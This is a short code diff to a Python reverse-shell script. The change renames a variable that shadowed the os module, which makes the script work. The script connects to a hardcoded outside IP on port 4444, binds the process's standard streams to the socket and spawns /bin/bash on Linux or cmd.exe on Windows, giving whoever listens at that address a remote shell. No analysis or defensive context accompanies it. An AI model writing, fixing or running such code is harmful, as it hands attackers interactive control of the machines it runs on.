@@ -5,17 +5,17 @@ import os
 import pty
 import threading
 
-os = platform.system()
+operating = platform.system()
 shell_ip = "141.55.32.128"
 port = 4444
 
 
-if os == "Linux":
+if operating == "Linux":
     s = socket.socket()
     s.connect((shell_ip, port))
     [os.dup2(s.fileno(),f) for f in(0,1,2)]
     pty.spawn("/bin/bash")
-elif os == "Windows":
+elif operating == "Windows":
     s = socket.socket()
     s.connect((shell_ip, port))
     p = subprocess.Popen(["cmd.exe"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
